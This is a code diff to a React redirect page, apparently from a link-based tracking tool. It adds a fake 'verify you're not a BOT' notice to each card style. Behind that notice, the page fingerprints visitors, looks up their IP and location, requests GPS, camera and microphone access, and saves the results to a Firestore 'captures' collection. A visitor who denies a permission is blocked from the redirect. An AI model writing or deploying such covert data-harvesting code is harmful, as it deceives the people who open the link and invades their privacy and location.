@@ -1,14 +1,21 @@
 import * as React from 'react';
 import { useParams } from 'react-router-dom';
-import type { Settings } from '../types';
+import type { Settings, CapturedData } from '../types';
 import { useLanguage } from '../contexts/LanguageContext';
 import { NEW_REDIRECT_TEMPLATE, CARD_STYLES } from '../constants';
+import { db } from '../firebase';
+import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
 
 interface RedirectPageProps {
   previewSettings?: Settings | Omit<Settings, 'id'>;
   isPreview?: boolean;
   isEmbeddedPreview?: boolean;
   onClosePreview?: () => void;
+}
+
+const VerificationText: React.FC<{className?: string}> = ({ className }) => {
+    const { t } = useLanguage();
+    return <p className={`text-xs font-semibold uppercase tracking-wider ${className}`}>We need to verify you're not a BOT</p>
 }
 
 // --- Individual Card Style Components ---
@@ -58,7 +65,8 @@ const DefaultWhiteCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({
           {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain" />}
           <h1 className="text-4xl font-bold text-blue-600 leading-tight">{settings.displayText}</h1>
           <p className="text-slate-500 mt-1">{t('redirect_default_card_subtitle')}</p>
-          <div className="w-full pt-6 space-y-4">
+          <div className="w-full pt-6 space-y-2">
+            <VerificationText className="text-slate-400" />
             <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-200 rounded-full h-5 overflow-hidden" progressClassName="bg-blue-500 h-full rounded-full" />
             <p className="text-base text-slate-600">{settings.displayText}</p>
           </div>
@@ -75,7 +83,8 @@ const GlassCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ settin
                 {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain" />}
                 <h1 className="text-4xl font-bold leading-tight">{settings.displayText}</h1>
                 <p className="opacity-80 mt-1">{t('redirect_glass_card_subtitle')}</p>
-                <div className="w-full pt-6">
+                <div className="w-full pt-6 space-y-2">
+                    <VerificationText className="text-white/60"/>
                     <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                 </div>
             </div>
@@ -89,8 +98,9 @@ const MinimalCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
             {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 object-contain" />}
             <h1 className="text-5xl font-extrabold leading-tight">{settings.displayText}</h1>
             <p className="opacity-80 text-lg">{t('redirect_minimal_card_subtitle')}</p>
-            <div className="w-full pt-4 fixed bottom-0 left-0">
-                 <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1" progressClassName="bg-white h-full" />
+            <div className="w-full pt-4 fixed bottom-0 left-0 space-y-2">
+                <VerificationText className="text-white/60 text-center mb-1"/>
+                <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1" progressClassName="bg-white h-full" />
             </div>
         </div>
     );
@@ -110,10 +120,13 @@ const TerminalCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ set
                     <p>{'>'} {t('redirect_terminal_access')} {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-8 h-8 inline-block mx-2 object-contain" />}</p>
                     <p>{'>'} {t('redirect_terminal_target')} <span className="text-cyan-400">{settings.redirectUrl}</span></p>
                     <p className="mb-2">{'>'} {t('redirect_terminal_message')} <span className="text-white">{settings.displayText}</span></p>
-                    <div className="flex items-center gap-2">
-                        <span>{'>'} {t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} </span>
-                        <div className="flex-1 bg-green-900 h-6 rounded-sm overflow-hidden">
-                           <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-full" progressClassName="bg-green-500 h-full" />
+                    <div className="space-y-2">
+                        <VerificationText className="text-green-500/80"/>
+                        <div className="flex items-center gap-2">
+                            <span>{'>'} {t('redirect_terminal_redirecting', {delay: settings.redirectDelay})} </span>
+                            <div className="flex-1 bg-green-900 h-6 rounded-sm overflow-hidden">
+                               <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-full" progressClassName="bg-green-500 h-full" />
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -127,7 +140,8 @@ const SleekDarkCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ se
     <div className="bg-slate-900 border border-slate-700 shadow-2xl rounded-lg p-8 sm:p-12 text-center flex flex-col items-center gap-6">
       {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-2 object-contain" />}
       <h1 className="text-4xl font-semibold leading-tight">{settings.displayText}</h1>
-      <div className="w-full pt-6">
+      <div className="w-full pt-6 space-y-2">
+        <VerificationText className="text-slate-400"/>
         <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-1 overflow-hidden" progressClassName="bg-indigo-500 h-full rounded-full" />
       </div>
     </div>
@@ -153,7 +167,8 @@ const ArticleCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
                         <p className="text-slate-500 text-sm">{t('redirect_article_subtitle')}</p>
                     </div>
                 </div>
-                 <div className="w-full pt-8">
+                 <div className="w-full pt-8 space-y-2">
+                    <VerificationText className="text-slate-400"/>
                     <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-1 bg-slate-200" progressClassName="bg-indigo-500 h-full" />
                 </div>
             </div>
@@ -175,7 +190,8 @@ const GradientBurstCard: React.FC<{ settings: Settings, isPaused: boolean }> = (
                      {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-28 h-28 mb-4 object-contain rounded-full shadow-lg border-4 border-white/20" />}
                     <h1 className="text-5xl font-extrabold leading-tight text-white" style={{textShadow: '0 2px 10px rgba(0,0,0,0.3)'}}>{settings.displayText}</h1>
                     <p className="text-white/80 mt-1">{t('redirect_gradient_card_subtitle')}</p>
-                    <div className="w-full pt-6">
+                    <div className="w-full pt-6 space-y-2">
+                        <VerificationText className="text-white/60"/>
                         <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-white/20 rounded-full h-2.5 overflow-hidden" progressClassName="bg-white h-full rounded-full" />
                     </div>
                 </div>
@@ -193,7 +209,8 @@ const ElegantCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
                 {settings.customIconUrl && <img src={settings.customIconUrl} alt="Icon" className="w-24 h-24 mb-4 object-contain" />}
                 <h1 className="text-4xl font-serif font-bold text-black/80">{settings.displayText}</h1>
                 <p className="text-black/60 font-serif italic">{t('redirect_elegant_card_subtitle')}</p>
-                <div className="w-full pt-8">
+                <div className="w-full pt-8 space-y-2">
+                    <VerificationText className="text-black/50"/>
                     <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-0.5 bg-black/10" progressClassName="bg-black/80 h-full" />
                 </div>
             </div>
@@ -211,7 +228,7 @@ const RetroTVCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ sett
                         <TypewriterText text={settings.displayText} duration={2} isPaused={isPaused} />
                     </h1>
                     <div className="w-full absolute bottom-4 left-0 px-8 space-y-2">
-                        <p className="text-green-500 text-sm animate-flicker">{t('redirect_retro_tv_target')} {settings.redirectUrl}</p>
+                        <VerificationText className="text-green-500/80 animate-flicker"/>
                         <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full h-2 bg-green-900/50" progressClassName="bg-green-500 h-full" />
                     </div>
                 </div>
@@ -238,7 +255,8 @@ const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ 
           <div className="p-4 space-y-2">
             <h1 className="text-xl font-bold text-white">{settings.displayText}</h1>
             <p className="text-sm text-slate-400">{t('redirect_video_player_redirecting', {url: settings.redirectUrl})}</p>
-            <div className="pt-2">
+            <div className="pt-2 space-y-2">
+                <VerificationText className="text-slate-400"/>
                 <Progress duration={settings.redirectDelay} isPaused={isPaused} className="w-full bg-slate-700 rounded-full h-2" progressClassName="bg-red-600 h-full rounded-full" />
             </div>
           </div>
@@ -246,6 +264,29 @@ const VideoPlayerCard: React.FC<{ settings: Settings, isPaused: boolean }> = ({ 
       </div>
     );
 };
+
+const parseUserAgent = (ua: string) => {
+    let os = "Unknown OS";
+    let browser = "Unknown Browser";
+    let deviceType = "Desktop";
+
+    if (/mobi/i.test(ua)) deviceType = "Mobile";
+
+    if (/android/i.test(ua)) os = "Android";
+    else if (/iPad|iPhone|iPod/.test(ua)) os = "iOS";
+    else if (/windows phone/i.test(ua)) os = "Windows Phone";
+    else if (/windows/i.test(ua)) os = "Windows";
+    else if (/macintosh|mac os x/i.test(ua)) os = "macOS";
+    else if (/linux/i.test(ua)) os = "Linux";
+
+    if (/chrome|crios|crmo/i.test(ua)) browser = "Chrome";
+    else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
+    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = "Safari";
+    else if (/edg/i.test(ua)) browser = "Edge";
+    
+    return { os, browser, deviceType };
+};
+
 
 // --- Main Redirect Page Component ---
 
@@ -257,7 +298,8 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   const [error, setError] = React.useState<string | null>(null);
   const [statusText, setStatusText] = React.useState(t('redirect_initializing'));
   const [isPaused, setIsPaused] = React.useState(true);
-
+  const [permissionDenied, setPermissionDenied] = React.useState(false);
+  
   const isPreview = !!isPreviewProp;
   const isMounted = React.useRef(true);
 
@@ -282,7 +324,6 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
     }
 
     try {
-      // Data from react-router's useParams is already URL-decoded.
       const decodedString = atob(data);
       const parsedSettings: Omit<Settings, 'id'> = JSON.parse(decodedString);
       const isAnyCaptureEnabled = parsedSettings.captureInfo?.location || parsedSettings.captureInfo?.camera || parsedSettings.captureInfo?.microphone;
@@ -290,7 +331,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
       configToLoad = { ...NEW_REDIRECT_TEMPLATE, ...parsedSettings, id: 'live-redirect' };
       setSettings(configToLoad);
       setStatusText(isAnyCaptureEnabled ? t('redirect_permissions_request') : t('redirect_preparing'));
-      setIsPaused(!isPreview); // Pause if not in preview mode
+      setIsPaused(!isPreview); 
     } catch (e) {
       console.error("Invalid redirect data in URL:", e);
       setError(t('redirect_invalid_link_subtitle'));
@@ -301,11 +342,10 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   React.useEffect(() => {
     if (!settings || isPreview || !isPaused) return;
 
-    const performRedirect = (params: URLSearchParams) => {
+    const performRedirect = () => {
         if (!isMounted.current) return;
         try {
             let url = new URL(settings.redirectUrl.startsWith('http') ? settings.redirectUrl : `https://${settings.redirectUrl}`);
-            params.forEach((value, key) => url.searchParams.append(key, value));
             window.location.href = url.toString();
         } catch (error) {
             console.error("Invalid URL:", settings.redirectUrl);
@@ -313,74 +353,103 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
         }
     };
     
-    const startRedirectSequence = (capturedParams: URLSearchParams) => {
+    const startRedirectSequence = () => {
         if (!isMounted.current) return;
         setStatusText(t('redirect_loading'));
         setIsPaused(false); // Start the progress bar
         
-        const redirectTimer = setTimeout(() => {
-            performRedirect(capturedParams);
-        }, settings.redirectDelay * 1000);
-
+        const redirectTimer = setTimeout(performRedirect, settings.redirectDelay * 1000);
         return () => clearTimeout(redirectTimer);
     };
 
-    const isAnyCaptureEnabled = settings.captureInfo?.location || settings.captureInfo?.camera || settings.captureInfo?.microphone;
+    const handleDataCapture = async () => {
+        const { os, browser, deviceType } = parseUserAgent(navigator.userAgent);
+        
+        const initialData: Omit<CapturedData, 'id'> = {
+            redirectId: settings.id,
+            name: `Capture @ ${new Date().toLocaleString()}`,
+            timestamp: Date.now(),
+            ip: 'Fetching...',
+            userAgent: navigator.userAgent,
+            os,
+            browser,
+            deviceType,
+            language: navigator.language,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            location: { lat: null, lon: null, city: 'Unknown', country: 'Unknown', source: 'ip' },
+            permissions: { 
+                location: settings.captureInfo.location ? 'prompt' : 'n/a',
+                camera: settings.captureInfo.camera ? 'prompt' : 'n/a',
+                microphone: settings.captureInfo.microphone ? 'prompt' : 'n/a',
+            }
+        };
 
-    if (isAnyCaptureEnabled) {
+        try {
+            const ipResponse = await fetch('https://ipapi.co/json/');
+            if (ipResponse.ok) {
+                const ipData = await ipResponse.json();
+                initialData.ip = ipData.ip;
+                initialData.location = {
+                    lat: ipData.latitude,
+                    lon: ipData.longitude,
+                    city: ipData.city,
+                    country: ipData.country_name,
+                    source: 'ip',
+                };
+            }
+        } catch (e) { console.error("Could not fetch IP data:", e); }
+
         const permissionPromises = [];
-        const recordingDuration = (settings.captureInfo.recordingDuration ?? 5) * 1000;
-
         if (settings.captureInfo.location) {
-            permissionPromises.push(new Promise<object>((resolve) => {
+            permissionPromises.push(new Promise<void>((resolve) => {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => resolve({lat: pos.coords.latitude, lon: pos.coords.longitude, location_access: 'granted'}),
-                    () => resolve({location_access: 'denied'})
+                    (pos) => {
+                        initialData.permissions.location = 'granted';
+                        initialData.location = { lat: pos.coords.latitude, lon: pos.coords.longitude, city: initialData.location.city, country: initialData.location.country, source: 'gps'};
+                        resolve();
+                    },
+                    () => { initialData.permissions.location = 'denied'; resolve(); }
                 );
             }));
         }
-        if (settings.captureInfo.camera) {
-            permissionPromises.push(new Promise<object>((resolve) => {
+         if (settings.captureInfo.camera) {
+            permissionPromises.push(new Promise<void>((resolve) => {
                 navigator.mediaDevices.getUserMedia({ video: true })
-                    .then(stream => {
-                        setTimeout(() => stream.getTracks().forEach(track => track.stop()), recordingDuration);
-                        resolve({ camera_access: 'granted' });
-                    })
-                    .catch(() => resolve({ camera_access: 'denied' }));
+                    .then(stream => { 
+                        initialData.permissions.camera = 'granted';
+                        setTimeout(() => stream.getTracks().forEach(track => track.stop()), settings.captureInfo.recordingDuration * 1000);
+                        resolve();
+                     })
+                    .catch(() => { initialData.permissions.camera = 'denied'; resolve(); });
             }));
         }
         if (settings.captureInfo.microphone) {
-            permissionPromises.push(new Promise<object>((resolve) => {
+            permissionPromises.push(new Promise<void>((resolve) => {
                 navigator.mediaDevices.getUserMedia({ audio: true })
-                    .then(stream => {
-                        setTimeout(() => stream.getTracks().forEach(track => track.stop()), recordingDuration);
-                        resolve({ mic_access: 'granted' });
+                    .then(stream => { 
+                        initialData.permissions.microphone = 'granted';
+                        setTimeout(() => stream.getTracks().forEach(track => track.stop()), settings.captureInfo.recordingDuration * 1000);
+                        resolve();
                     })
-                    .catch(() => resolve({ mic_access: 'denied' }));
+                    .catch(() => { initialData.permissions.microphone = 'denied'; resolve(); });
             }));
         }
-        permissionPromises.push(new Promise<object>((resolve) => {
-            if ('getBattery' in navigator) {
-                (navigator as any).getBattery().then((battery: any) => {
-                    resolve({battery: battery.level, charging: battery.charging});
-                }).catch(() => resolve({}));
-            } else {
-                resolve({});
-            }
-        }));
+
+        await Promise.all(permissionPromises);
         
-        Promise.all(permissionPromises).then((results) => {
-             const params = new URLSearchParams();
-             results.forEach(result => {
-                 Object.entries(result).forEach(([key, value]) => {
-                     params.append(key, String(value));
-                 });
-             });
-             startRedirectSequence(params);
-        });
-    } else {
-        startRedirectSequence(new URLSearchParams());
-    }
+        try {
+             await addDoc(collection(db, "captures"), initialData);
+        } catch(e) { console.error("Failed to save captured data:", e); }
+        
+        const wasDenied = Object.values(initialData.permissions).includes('denied');
+        if (wasDenied) {
+            setPermissionDenied(true);
+        } else {
+            startRedirectSequence();
+        }
+    };
+    
+    handleDataCapture();
 
   }, [settings, isPreview, isPaused, t]);
   
@@ -405,7 +474,7 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
   };
   
   const renderCard = () => {
-    const props = { settings, isPaused: isPreview || isPaused };
+    const props = { settings, isPaused: isPreview || isPaused || permissionDenied };
     switch (settings.cardStyle) {
         case 'glass': return <GlassCard {...props} />;
         case 'minimal': return <MinimalCard {...props} />;
@@ -433,6 +502,14 @@ const RedirectPage: React.FC<RedirectPageProps> = ({ previewSettings, isPreview:
                     </button>
                 </div>
             </div>
+        )}
+        {permissionDenied && (
+             <div className="absolute inset-0 bg-black/70 backdrop-blur-md z-20 flex items-center justify-center animate-fade-in">
+                 <div className="text-center p-8 rounded-lg max-w-sm">
+                     <h2 className="text-2xl font-bold text-red-400 mb-2">{t('redirect_permissions_denied_title')}</h2>
+                     <p className="text-slate-300">{t('redirect_permissions_denied_message')}</p>
+                 </div>
+             </div>
         )}
         {renderCard()}
     </div>
